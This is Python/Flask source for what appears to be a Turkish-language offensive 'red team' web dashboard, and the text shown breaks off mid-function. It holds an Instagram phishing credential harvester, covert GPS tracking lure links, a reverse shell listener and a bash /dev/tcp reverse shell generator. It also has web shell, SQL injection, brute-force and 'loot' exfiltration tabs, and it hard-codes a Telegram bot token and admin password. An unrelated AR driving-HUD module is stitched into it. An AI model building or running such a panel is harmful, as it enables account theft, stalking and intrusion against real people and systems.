import os
import time
import socket
import ssl
import urllib.parse
import requests
import threading
import subprocess
import re
import csv
import zipfile
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from flask import Flask, render_template_string, request, jsonify, Response, send_file, session, redirect, url_for
from datetime import datetime
from fpdf import FPDF
import io

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "9082287913:AAEw9lMwKXfRTGf4LzQiF1UEgLZDHzNuc8o")
BASE_URL = f"https://api.telegram.org/bot{TOKEN}"

ADMIN_USER = "root1"
ADMIN_PASS = "toor1"

SITE_DATABASE = []
CLICK_LOGS = []
CREDENTIAL_LOGS = []
DRIVING_SESSIONS = []
SCHEDULED_TARGETS = []
NOTIFY_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

app = Flask(__name__)
app.secret_key = "kali_linux_secret_key_998877"

LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Kali Linux - Red Team Operations Center</title>
    <style>
        body { background-color: #0b0f15; color: #00ff66; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #121824; padding: 40px; border-radius: 6px; border: 1px solid #00ff66; box-shadow: 0 0 25px rgba(0,255,102,0.2); width: 350px; text-align: center; }
        h2 { color: #38bdf8; margin-bottom: 25px; text-shadow: 0 0 10px rgba(56,189,248,0.4); }
        .input-group { margin-bottom: 20px; text-align: left; }
        label { display: block; margin-bottom: 8px; font-size: 13px; color: #94a3b8; }
        input { width: 100%; padding: 12px; border-radius: 4px; border: 1px solid #334155; background: #070a0f; color: #00ff66; font-size: 15px; box-sizing: border-box; font-family: 'Courier New', Courier, monospace; outline: none; }
        input:focus { border-color: #00ff66; box-shadow: 0 0 8px rgba(0,255,102,0.4); }
        button { width: 100%; padding: 12px; background: #0284c7; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: bold; font-family: 'Courier New', Courier, monospace; transition: 0.2s; }
        button:hover { background: #0369a1; box-shadow: 0 0 10px rgba(2,132,199,0.5); }
        .error { color: #f87171; margin-bottom: 15px; font-size: 13px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>kali@root-terminal:~#</h2>
        {% if error %}<div class="error">{{ error }}</div>{% endif %}
        <form method="POST">
            <div class="input-group"><label>Username</label><input type="text" name="username" required autofocus></div>
            <div class="input-group"><label>Password</label><input type="password" name="password" required></div>
            <button type="submit">Authenticate</button>
        </form>
    </div>
</body>
</html>
"""

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Kali Linux - Red Team Operations Center</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        body { background-color: #090d14; color: #e2e8f0; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 15px; }
        .container { max-width: 1380px; margin: 0 auto; background: #121824; padding: 25px; border-radius: 8px; border: 1px solid #1e293b; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
        .header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 2px solid #1e293b; padding-bottom: 12px; }
        h1 { color: #38bdf8; margin: 0; font-size: 22px; text-shadow: 0 0 10px rgba(56,189,248,0.3); }
        .logout-btn { background: #991b1b; color: white; padding: 6px 14px; border-radius: 4px; text-decoration: none; font-size: 13px; font-weight: bold; }
        .logout-btn:hover { background: #7f1d1d; }
        .tabs { display: flex; gap: 5px; margin-bottom: 20px; flex-wrap: wrap; background: #0a0e17; padding: 8px; border-radius: 6px; border: 1px solid #1e293b; }
        .tab-btn { background: #1a2332; color: #94a3b8; border: 1px solid #283548; padding: 8px 12px; border-radius: 4px; cursor: pointer; font-weight: bold; transition: 0.2s; font-size: 12px; font-family: 'Courier New', Courier, monospace; }
        .tab-btn:hover { background: #283548; color: #fff; }
        .tab-btn.active { background: #0284c7; color: white; border-color: #38bdf8; box-shadow: 0 0 8px rgba(56,189,248,0.4); }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .form-group { display: flex; flex-direction: column; gap: 8px; margin-bottom: 15px; }
        label { color: #38bdf8; font-size: 13px; font-weight: bold; }
        input[type="text"], select, textarea, input[type="file"], input[type="number"], input[type="password"] { padding: 12px; border-radius: 4px; border: 1px solid #334155; background: #070a0f; color: #00ff66; font-size: 14px; font-family: 'Courier New', Courier, monospace; outline: none; }
        input:focus { border-color: #38bdf8; box-shadow: 0 0 6px rgba(56,189,248,0.3); }
        textarea { resize: vertical; height: 100px; }
        button { padding: 12px 20px; background: #0284c7; color: white; border: none; border-radius: 4px; font-size: 15px; cursor: pointer; transition: 0.2s; font-weight: bold; font-family: 'Courier New', Courier, monospace; }
        button:hover { background: #0369a1; box-shadow: 0 0 10px rgba(2,132,199,0.5); }
        button.secondary { background: #0d9488; }
        button.success { background: #15803d; }
        button.danger { background: #b91c1c; }
        .terminal { background: #05070a; color: #00ff66; padding: 18px; border-radius: 6px; border: 1px solid #1e293b; white-space: pre-wrap; font-family: 'Courier New', Courier, monospace; margin-top: 15px; max-height: 480px; overflow-y: auto; font-size: 13px; line-height: 1.4; box-shadow: inset 0 0 15px rgba(0,0,0,0.8); }
        .loading { color: #facc15; font-style: italic; font-weight: bold; font-size: 14px; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #0a0e17; border-radius: 6px; overflow: hidden; border: 1px solid #1e293b; }
        th, td { padding: 10px 14px; text-align: left; border-bottom: 1px solid #1e293b; font-size: 13px; vertical-align: middle; }
        th { background: #0284c7; color: white; }
        tr:hover { background: #161f30; }
        .mini-map { width: 160px; height: 100px; border-radius: 4px; border: 1px solid #334155; display: inline-block; }
        .snapshot-img { width: 90px; height: 65px; border-radius: 4px; border: 1px solid #334155; object-fit: cover; }
        .payload-box { background: #0a0e17; padding: 12px; border-radius: 6px; border: 1px solid #1e293b; margin-bottom: 12px; }
        .dashboard-row { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
        .dashboard-card { flex: 1; background: #0a0e17; padding: 18px; border-radius: 6px; border: 1px solid #1e293b; text-align: center; min-width: 250px; }
        
        /* Gelişmiş AR HUD Stilleri & Auto-Dimming & Yakıt */
        .ar-container { position: relative; width: 100%; max-width: 750px; margin: 0 auto; background: #000; border-radius: 8px; overflow: hidden; border: 2px solid #38bdf8; box-shadow: 0 0 25px rgba(56,189,248,0.5); transition: 0.3s; }
        .ar-container:fullscreen { max-width: 100%; width: 100vw; height: 100vh; border: none; border-radius: 0; }
        #arVideo { width: 100%; height: 450px; object-fit: cover; display: block; filter: brightness(100%) contrast(100%); transition: filter 0.3s; }
        .ar-container:fullscreen #arVideo { height: 100vh; }
        #arCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
        
        .ar-hud { position: absolute; top: 15px; left: 15px; right: 15px; background: rgba(11, 15, 21, 0.85); border: 1px solid #00ff66; padding: 10px 15px; border-radius: 6px; font-size: 12px; color: #00ff66; z-index: 10; display: flex; justify-content: space-between; align-items: center; transition: background 0.3s, border-color 0.3s; }
        .ar-weather-hud { position: absolute; top: 75px; right: 15px; background: rgba(11, 15, 21, 0.8); border: 1px solid #38bdf8; padding: 6px 10px; border-radius: 4px; font-size: 11px; color: #38bdf8; z-index: 10; pointer-events: none; }
        .ar-fuel-hud { position: absolute; top: 75px; left: 15px; background: rgba(11, 15, 21, 0.85); border: 1px solid #facc15; padding: 6px 12px; border-radius: 4px; font-size: 11px; color: #facc15; z-index: 10; font-weight: bold; }

        .ar-controls { background: #0a0e17; padding: 12px; border-radius: 6px; border: 1px solid #1e293b; margin-bottom: 12px; display: flex; gap: 12px; flex-wrap: wrap; align-items: center; }
        .ar-controls label { color: #e2e8f0; font-size: 12px; cursor: pointer; display: flex; align-items: center; gap: 5px; }
        .ar-controls input[type="checkbox"] { accent-color: #00ff66; width: 15px; height: 15px; cursor: pointer; }
        
        .ar-log-box { background: #05070a; border: 1px solid #38bdf8; border-radius: 6px; padding: 12px; margin-top: 15px; max-height: 160px; overflow-y: auto; font-family: 'Courier New', Courier, monospace; font-size: 12px; color: #38bdf8; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header-bar">
            <h1>kali@kali-linux:~/red-team-ops#</h1>
            <a href="/logout" class="logout-btn">[x] Logout</a>
        </div>
        
        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('scanTab')">🚀 Recon</button>
            <button class="tab-btn" onclick="switchTab('phishTab')">📸 Insta Phishing</button>
            <button class="tab-btn" onclick="switchTab('lureTab')">🎯 GPS & Tracker</button>
            <button class="tab-btn" onclick="switchTab('arNavTab')">🧭 AR Navigasyon & HUD</button>
            <button class="tab-btn" onclick="switchTab('drivingTab')">⛽ Sürüş Raporları & Kara Kutu</button>
            <button class="tab-btn" onclick="switchTab('crackerTab')">🔑 Hash Cracker</button>
            <button class="tab-btn" onclick="switchTab('shellListenerTab')">💻 Shell Listener</button>
            <button class="tab-btn" onclick="switchTab('telegramTab')">🤖 Telegram</button>
            <button class="tab-btn" onclick="switchTab('wifiTab')">📶 Wi-Fi Audit</button>
            <button class="tab-btn" onclick="switchTab('niktoTab')">🛡️ Nikto</button>
            <button class="tab-btn" onclick="switchTab('dnsTab')">🌍 DNS Dig</button>
            <button class="tab-btn" onclick="switchTab('sqlmapTab')">⚡ SQLmap</button>
            <button class="tab-btn" onclick="switchTab('subdomainTab')">🌐 Subdomain</button>
            <button class="tab-btn" onclick="switchTab('bruteTab')">🔐 Brute</button>
            <button class="tab-btn" onclick="switchTab('shellTab')">💻 Web Shell</button>
            <button class="tab-btn" onclick="switchTab('lootingTab')">🏴‍☠️ Looting</button>
            <button class="tab-btn" onclick="switchTab('analysisTab')">🔍 Secret</button>
            <button class="tab-btn" onclick="switchTab('payloadTab')">🛠️ Payloads</button>
            <button class="tab-btn" onclick="switchTab('dataTab')">📁 Archive</button>
        </div>

        <!-- 1. Keşif -->
        <div id="scanTab" class="tab-content active">
            <div class="form-group"><label>Target URL / IP:</label><input type="text" id="targetUrl" placeholder="example.com"></div>
            <button onclick="startScan(false)">Execute Comprehensive Recon</button>
            <div id="status" class="loading" style="margin-top: 15px;"></div>
            <div class="actions" id="actionButtons" style="display:none; gap:10px; margin-top:15px;">
                <button class="secondary" onclick="downloadReport('txt')">📥 Save TXT</button>
                <button class="danger" onclick="downloadReport('pdf')">📄 Export PDF</button>
                <button class="success" onclick="sendToTelegram()">📤 Send to Telegram</button>
            </div>
            <div id="results" class="terminal" style="display:none;"></div>
        </div>

        <!-- Instagram Phishing Sekmesi -->
        <div id="phishTab" class="tab-content">
            <h3>📸 Instagram Phishing & Credential Harvester</h3>
            <div class="form-group"><label>Sahte Instagram Giriş Linki:</label><input type="text" id="instaLink" readonly style="color: #38bdf8;"></div>
            <button class="success" onclick="generateInstaLink()">Link Üret</button>
            <div id="credsContainer" style="margin-top:15px;"><p style='color: #94a3b8;'>Yakalanan hesap yok.</p></div>
        </div>

        <!-- Lure Link & Tracker Sekmesi -->
        <div id="lureTab" class="tab-content">
            <h3>🎯 Gelişmiş GPS & Cihaz İstihbarat Tracker</h3>
            <button class="success" onclick="generateLureLink()">Takip Linki Üret</button>
            <div class="form-group" style="margin-top: 15px;"><input type="text" id="generatedLink" readonly style="color: #38bdf8;"></div>
            <div id="clickLogsContainer" style="margin-top:15px;"><p style='color: #94a3b8;'>Veri yok.</p></div>
        </div>

        <!-- AR Navigasyon & Taktiksel HUD Modülü -->
        <div id="arNavTab" class="tab-content">
            <h3>🧭 Ultimate AR Navigasyon, Auto-Dimming, Yakıt & ETA Takibi</h3>
            <p style="color: #94a3b8; font-size: 13px;">Gece karartma, yakıt/menzil simülasyonu, şerit takip ve sürüş kara kutusu entegre çalışır.</p>
            
            <div class="ar-controls">
                <span style="color:#38bdf8; font-weight:bold;">Modül Kontrolleri:</span>
                <label><input type="checkbox" id="chkAutoDim" checked> 🌙 Auto-Dimming (Gece Karartma)</label>
                <label><input type="checkbox" id="chkLane" checked> 🚧 Şerit Takip Asistanı</label>
                <label><input type="checkbox" id="chkNightVision"> 🔦 Gece Görüşü / Termal</label>
                <label><input type="checkbox" id="chkCompass"> Jiroskop & Pusula</label>
                <label><input type="checkbox" id="chkSpatial" checked> Sesli Asistan</label>
            </div>

            <div class="form-group">
                <label>Hedef Operasyon / Rota:</label>
                <input type="text" id="arDestination" value="Saha Bölge Komuta Merkezi B-2">
            </div>
            
            <div style="display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap;">
                <button class="success" onclick="startARCamera()">📸 AR Kamerayı Başlat</button>
                <button class="success" onclick="finishDrivingSession()">🏁 Sürüşü Bitir & Rapor Al</button>
                <button class="secondary" onclick="toggleFullScreen()">📺 Tam Ekran</button>
                <button class="success" onclick="takeSnapshot()">📷 Kanıt Al</button>
                <button class="danger" onclick="stopARCamera()">🛑 Kapat</button>
            </div>

            <div class="ar-container" id="arBox">
                <div class="ar-hud" id="arHudBox">
                    <span id="arHudText">Durum: Hazır</span>
                    <span id="arTelemetry" style="color: #38bdf8;">HIZ: 0 km/s | ETA: --</span>
                </div>
                <div id="arFuelHud" class="ar-fuel-hud">⛽ Yakıt: %85 | Menzil: 240 km</div>
                <div id="arWeatherWidget" class="ar-weather-hud">⛅ 22°C | Grip: %92</div>
                
                <video id="arVideo" autoplay playsinline muted></video>
                <canvas id="arCanvas"></canvas>
            </div>

            <h4 style="margin-top: 20px; color: #38bdf8;">📋 Canlı Taktiksel Log Akışı & Kara Kutu Kayıtları:</h4>
            <div id="arLogTerminal" class="ar-log-box">[00:00:00] Sürüş kara kutusu başlatıldı. Tüm veriler loglanıyor...</div>
        </div>

        <!-- Sürüş Raporları & Kara Kutu Sekmesi -->
        <div id="drivingTab" class="tab-content">
            <h3>⛽ Sürüş Raporları & Kara Kutu (Blackbox) Arşivi</h3>
            <p style="color: #94a3b8; font-size: 13px;">AR ekranında "Sürüşü Bitir & Rapor Al" butonuna bastığında oluşturulan detaylı sürüş raporlarını ve yakıt/menzil analizlerini buradan indirebilirsin.</p>
            <div id="drivingReportsContainer">
                <p style='color:#94a3b8;'>Henüz kaydedilmiş bir sürüş raporu yok. AR Navigasyon sekmesinden sürüşü başlatıp bitirebilirsiniz.</p>
            </div>
        </div>

        <!-- Diğer Standart Sekmeler -->
        <div id="crackerTab" class="tab-content">
            <h3>🔑 Hash Cracker</h3>
            <div class="form-group"><select id="hashType"><option value="md5">MD5</option><option value="sha256">SHA-256</option></select></div>
            <div class="form-group"><input type="text" id="targetHash" placeholder="Hash giriniz"></div>
            <div class="form-group"><textarea id="wordlistArea">admin\n123456\nroot1\ntoor1\nsecret</textarea></div>
            <button class="danger" onclick="startHashCrack()">Hash Çöz</button>
            <div id="crackResults" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <div id="shellListenerTab" class="tab-content">
            <h3>💻 Reverse Shell Dinleyicisi</h3>
            <div class="form-group"><input type="number" id="listenerPort" value="4444"></div>
            <button class="success" onclick="startListener()">Dinlemeyi Başlat</button>
            <div id="listenerStatus" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <div id="telegramTab" class="tab-content">
            <h3>🤖 Telegram Bot Tester</h3>
            <div class="form-group"><input type="text" id="testChatId" value="{{ default_chat_id }}"></div>
            <button class="success" onclick="sendTelegramTest()">Test Gönder</button>
            <div id="telegramTestStatus" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <div id="wifiTab" class="tab-content">
            <h3>📶 Wi-Fi Audit</h3>
            <button class="success" onclick="runWifiAction('scan')">Ağları Tara</button>
            <div id="wifiResults" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <div id="niktoTab" class="tab-content">
            <h3>Nikto Web Vulnerability Scanner</h3>
            <div class="form-group"><label>Target URL:</label><input type="text" id="niktoTarget" placeholder="https://example.com"></div>
            <button class="secondary" onclick="startNiktoScan()">Run Nikto Module</button>
            <div id="niktoStatus" class="loading" style="margin-top: 15px;"></div>
            <div id="niktoResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="dnsTab" class="tab-content">
            <h3>DNS & Zone Enumeration</h3>
            <div class="form-group"><label>Domain:</label><input type="text" id="dnsDomain" placeholder="example.com"></div>
            <button class="secondary" onclick="startDnsRecon()">Query DNS Records</button>
            <div id="dnsStatus" class="loading" style="margin-top: 15px;"></div>
            <div id="dnsResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="sqlmapTab" class="tab-content">
            <h3>Automated SQL Injection (SQLmap Lite)</h3>
            <div class="form-group"><label>Vulnerable URL:</label><input type="text" id="sqlmapUrl" placeholder="https://example.com/page.php?id=1"></div>
            <button class="danger" onclick="startSqlmapLite()">Run SQLi Exploit Test</button>
            <div id="sqlmapStatus" class="loading" style="margin-top: 15px;"></div>
            <div id="sqlmapResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="subdomainTab" class="tab-content">
            <h3>Gobuster Subdomain Brute-Forcer</h3>
            <div class="form-group"><input type="text" id="subDomainInput" placeholder="example.com"></div>
            <button onclick="startSubdomainScan()">Start Subdomain Brute</button>
            <div id="subStatus" class="loading"></div>
            <div id="subResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="bruteTab" class="tab-content">
            <h3>Login Form Fuzzing & Brute-Force</h3>
            <div class="form-group"><input type="text" id="loginUrl" placeholder="https://example.com/login.php"></div>
            <div class="form-group" style="display:flex; gap:10px;"><input type="text" id="usernameField" placeholder="User field" style="flex:1;"><input type="text" id="passwordField" placeholder="Pass field" style="flex:1;"></div>
            <div class="form-group"><textarea id="passwordList">admin\n123456\nroot1\ntoor1\nsecret</textarea></div>
            <button class="danger" onclick="startBruteForce()">Launch Brute Attack</button>
            <div id="bruteStatus" class="loading"></div>
            <div id="bruteResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="shellTab" class="tab-content">
            <h3>Interactive Web Shell (RCE)</h3>
            <div class="form-group"><input type="text" id="shellCommand" placeholder="id, uname -a, cat /etc/passwd"></div>
            <button class="danger" onclick="executeWebShell()">Execute Command</button>
            <div id="shellResults" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <div id="lootingTab" class="tab-content">
            <h3>Exfiltrate Harvested Data (ZIP Archive)</h3>
            <div class="form-group"><select id="lootingTargetSelect"><option value="">No targets scanned yet...</option></select></div>
            <button class="success" onclick="downloadLootZip()">Download Loot ZIP</button>
        </div>

        <div id="analysisTab" class="tab-content">
            <h3>Secret & Credential Scanner</h3>
            <div class="form-group"><input type="file" id="analysisFile"></div>
            <button class="secondary" onclick="uploadAndAnalyzeFile()">Scan File for Secrets</button>
            <div id="analysisStatus" class="loading"></div>
            <div id="analysisResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="payloadTab" class="tab-content">
            <h3>Reverse Shell Generator</h3>
            <div class="form-group" style="display:flex; gap:10px;"><input type="text" id="attackerIp" placeholder="LHOST"><input type="text" id="attackerPort" placeholder="LPORT"><button onclick="generatePayloads()">Generate</button></div>
            <div class="payload-box"><b>Bash:</b><br><code id="bashPayload" style="color:#00ff66;">bash -i >& /dev/tcp/IP/PORT 0>&1</code></div>
        </div>

        <div id="dataTab" class="tab-content">
            <div class="export-bar" style="margin-bottom:15px;"><a href="/api/export/json" target="_blank"><button class="secondary">Export JSON</button></a> <a href="/api/export/csv" target="_blank"><button class="success">Export CSV</button></a></div>
            <h3>Operations Analytics</h3>
            <div class="dashboard-row">
                <div class="dashboard-card"><h4>Security Grade Distribution</h4><canvas id="gradeChart" style="max-height: 180px;"></canvas></div>
                <div class="dashboard-card"><h4>WAF Protection Status</h4><canvas id="wafChart" style="max-height: 180px;"></canvas></div>
            </div>
            <h3>Archived Targets</h3>
            <div id="databaseTableContainer">No archived data.</div>
        </div>
    </div>

    <script>
        let currentReportText = "", lastTarget = "", gradeChartInstance = null, wafChartInstance = null;
        let arStream = null, arInterval = null, compassHeading = 0, deviceBeta = 0;
        let currentDistance = 150, currentSpeed = 35, fuelLevel = 85, drivingRange = 240;
        let sessionLogs = [], lastSpokenTime = 0, lastLaneWarningTime = 0;

        function switchTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
            document.getElementById(tabId).classList.add('active');
            event.target.classList.add('active');
            if(tabId === 'drivingTab') loadDrivingReports();
            if(tabId === 'dataTab' || tabId === 'lootingTab') loadSiteDatabase();
            if(tabId === 'lureTab') loadClickLogs();
            if(tabId === 'phishTab') loadCreds();
            if(tabId !== 'arNavTab') stopARCamera();
        }

        function handleOrientation(event) {
            if (event.alpha !== null) compassHeading = Math.round(event.alpha);
            if (event.beta !== null) deviceBeta = Math.round(event.beta);
        }

        function speakSpatial(text, force = false) {
            let useSpatial = document.getElementById('chkSpatial').checked;
            let now = Date.now();
            if (!useSpatial || (!force && (now - lastSpokenTime < 10000))) return;
            if ('speechSynthesis' in window) {
                window.speechSynthesis.cancel();
                let utterance = new SpeechSynthesisUtterance(text);
                utterance.lang = 'tr-TR';
                utterance.rate = 1.0;
                window.speechSynthesis.speak(utterance);
                lastSpokenTime = now;
            }
        }

        function playThreatBeep() {
            try {
                let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                let osc = audioCtx.createOscillator();
                let gain = audioCtx.createGain();
                osc.type = 'sine';
                osc.frequency.setValueAtTime(750, audioCtx.currentTime);
                gain.gain.setValueAtTime(0.05, audioCtx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.15);
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                osc.start();
                osc.stop(audioCtx.currentTime + 0.15);
            } catch(e) {}
        }

        function toggleFullScreen() {
            let elem = document.getElementById('arBox');
            if (!document.fullscreenElement) {
                if (elem.requestFullscreen) elem.requestFullscreen();
            } else {
                if (document.exitFullscreen) document.exitFullscreen();
            }
        }

        function takeSnapshot() {
            let video = document.getElementById('arVideo');
            let canvas = document.getElementById('arCanvas');
            if (!video.srcObject) { alert("Kamera açık değil!"); return; }
            let snapCanvas = document.createElement('canvas');
            snapCanvas.width = video.videoWidth || 640;
            snapCanvas.height = video.videoHeight || 480;
            let sCtx = snapCanvas.getContext('2d');
            sCtx.drawImage(video, 0, 0, snapCanvas.width, snapCanvas.height);
            sCtx.drawImage(canvas, 0, 0, snapCanvas.width, snapCanvas.height);

            let a = document.createElement('a');
            a.href = snapCanvas.toDataURL('image/png');
            a.download = `AR_TACTICAL_PROOF_${Date.now()}.png`;
            a.click();
            speakSpatial("Kanıt görüntüsü kaydedildi.", true);
        }

        // --- AR MOTORU: AUTO-DIMMING, YAKIT & ETA ENTEGRELİ ---
        async function startARCamera() {
            let video = document.getElementById('arVideo');
            let hud = document.getElementById('arHudText');
            let telemetry = document.getElementById('arTelemetry');
            let fuelHud = document.getElementById('arFuelHud');
            let hudBox = document.getElementById('arHudBox');
            let canvas = document.getElementById('arCanvas');
            let logTerminal = document.getElementById('arLogTerminal');
            let dest = document.getElementById('arDestination').value || 'Hedef';

            sessionLogs = [];
            fuelLevel = 85;
            drivingRange = 240;
            currentDistance = 150;

            window.addEventListener('deviceorientation', handleOrientation, true);

            try {
                arStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false });
            } catch (err) {
                try { arStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); } 
                catch (e) { alert("Kamera erişimi sağlanamadı!"); return; }
            }

            video.srcObject = arStream;
            hud.innerText = "HUD Aktif: Rota Çiziliyor";
            speakSpatial("AR Navigasyon ve yakıt takibi başlatıldı.", true);

            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            let ctx = canvas.getContext('2d');

            let step = 0;
            arInterval = setInterval(() => {
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                let w = canvas.width;
                let h = canvas.height;

                // 1. 🌙 Auto-Dimming (Akıllı Gece / Gündüz Karartma Modu)
                let useAutoDim = document.getElementById('chkAutoDim').checked;
                let currentHour = new Date().getHours();
                let isNight = currentHour >= 20 || currentHour < 6;

                if (useAutoDim && isNight) {
                    video.style.filter = "brightness(65%) contrast(120%)";
                    hudBox.style.background = "rgba(5, 7, 10, 0.95)";
                    hudBox.style.borderColor = "#15803d";
                } else {
                    video.style.filter = "brightness(100%) contrast(100%)";
                    hudBox.style.background = "rgba(11, 15, 21, 0.85)";
                    hudBox.style.borderColor = "#00ff66";
                }

                // 2. Şerit Takip Asistanı
                let useLane = document.getElementById('chkLane').checked;
                let isLaneViolated = false;
                if (useLane) {
                    ctx.strokeStyle = 'rgba(0, 255, 102, 0.5)';
                    ctx.lineWidth = 3;
                    ctx.setLineDash([15, 10]);
                    ctx.beginPath(); ctx.moveTo(w * 0.25, h); ctx.lineTo(w * 0.42, h * 0.48); ctx.stroke();
                    ctx.beginPath(); ctx.moveTo(w * 0.75, h); ctx.lineTo(w * 0.58, h * 0.48); ctx.stroke();
                    ctx.setLineDash([]);

                    if (Math.abs(deviceBeta) > 25) { isLaneViolated = true; }
                }

                let timestamp = new Date().toLocaleTimeString();
                if (useLane && isLaneViolated) {
                    let now = Date.now();
                    ctx.strokeStyle = '#ef4444'; ctx.lineWidth = 4;
                    ctx.strokeRect(10, 10, w - 20, h - 20);
                    hud.innerText = "⚠️ DİKKAT: Şeritten Sapma!";
                    if (now - lastLaneWarningTime > 6000) {
                        lastLaneWarningTime = now;
                        playThreatBeep();
                        speakSpatial("Şerit ihlali!", true);
                        sessionLogs.push(`[${timestamp}] ⚠️ ŞERİT İHLALİ ALGILANDI`);
                    }
                }

                // Holografik Yol Çizgisi
                let centerX = (w / 2);
                let bottomY = h, horizonY = h * 0.48;

                ctx.beginPath();
                ctx.moveTo(centerX - 60, bottomY); ctx.lineTo(centerX + 60, bottomY);
                for (let y = bottomY; y >= horizonY; y -= 10) {
                    let wave = Math.sin((y + step * 6) * 0.03) * 10;
                    let factor = (bottomY - y) / (bottomY - horizonY);
                    let curW = 60 * (1 - factor * 0.8);
                    ctx.lineTo(centerX + wave + curW, y);
                }
                for (let y = horizonY; y <= bottomY; y += 10) {
                    let wave = Math.sin((y + step * 6) * 0.03) * 10;
                    let factor = (bottomY - y) / (bottomY - horizonY);
                    let curW = 60 * (1 - factor * 0.8);
                    ctx.lineTo(centerX + wave - curW, y);
                }
                ctx.closePath();
                let trailGrad = ctx.createLinearGradient(0, horizonY, 0, bottomY);
                trailGrad.addColorStop(0, 'rgba(0, 255, 102, 0.05)');
                trailGrad.addColorStop(1, 'rgba(0, 255, 102, 0.8)');
                ctx.fillStyle = trailGrad;
                ctx.fill();

                // ⛽ Yakıt, Menzil & ETA (Varış Süresi) Güncelleme
                if (step % 50 === 0) {
                    if (currentDistance > 3) {
                        currentDistance -= 3;
                        if(fuelLevel > 5) fuelLevel -= 0.2;
                        if(drivingRange > 10) drivingRange -= 1;
                    }
                    let etaMinutes = Math.ceil(currentDistance / 35);
                    telemetry.innerText = `HIZ: ${currentSpeed} km/s | ETA: ${etaMinutes} dk | Kalan: ${currentDistance}m`;
                    fuelHud.innerText = `⛽ Yakıt: %${Math.round(fuelLevel)} | Menzil: ${drivingRange} km`;
                }

                // Canlı log kaydı
                if (step % 40 === 0) {
                    let logStr = `[${timestamp}] Hız: ${currentSpeed} km/s | Yakıt: %${Math.round(fuelLevel)} | Kalan Mesafe: ${currentDistance}m`;
                    sessionLogs.push(logStr);
                    logTerminal.innerHTML += `<br>` + logStr;
                    logTerminal.scrollTop = logTerminal.scrollHeight;
                }

                step++;
            }, 80);
        }

        function stopARCamera() {
            if (arStream) { arStream.getTracks().forEach(t => t.stop()); arStream = null; }
            if (arInterval) { clearInterval(arInterval); arInterval = null; }
            window.removeEventListener('deviceorientation', handleOrientation, true);
            let video = document.getElementById('arVideo');
            video.srcObject = null;
            video.style.filter = "none";
            document.getElementById('arHudText').innerText = "Durum: Kapalı";
        }

        // --- SÜRÜŞ RAPORLARI & KARA KUTU KAYDETME ---
        async function finishDrivingSession() {
            stopARCamera();
            if(sessionLogs.length === 0) { alert("Kaydedilmiş sürüş verisi bulunamadı!"); return; }
            let sessionData = {
                time: new Date().toLocaleString(),
                logs: sessionLogs
            };
            let res = await fetch('/api/driving/save', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(sessionData) });
            let data = await res.json();
            alert("Sürüş başarıyla tamamlandı! 'Sürüş Raporları' sekmesinden kara kutu raporunu indirebilirsin.");
            switchTab('drivingTab');
        }

        async function loadDrivingReports() {
            let res = await fetch('/api/driving/reports');
            let data = await res.json();
            let container = document.getElementById('drivingReportsContainer');
            if(data.reports.length === 0) { container.innerHTML = "<p style='color:#94a3b8;'>Henüz kaydedilmiş rapor yok.</p>"; return; }
            let html = `<table><thead><tr><th>Tarih & Saat</th><th>Telemetri Satır Sayısı</th><th>Kara Kutu Dosyası</th></tr></thead><tbody>`;
            data.reports.forEach((r, idx) => {
                html += `<tr><td>${r.time}</td><td>${r.logs.length} satır kayıt</td><td><a href="/api/driving/download?index=${idx}" target="_blank"><button class="success">📥 Raporu İndir (.TXT)</button></a></td></tr>`;
            });
            html += `</tbody></table>`;
            container.innerHTML = html;
        }

        // Standart fonksiyonlar
        async function startScan(targetOverride = false) {
            let url = targetOverride ? targetOverride : document.getElementById('targetUrl').value.trim();
            if(!url) { alert('Specify target!'); return; }
            lastTarget = url;
            let statusDiv = document.getElementById('status'), resultsDiv = document.getElementById('results');
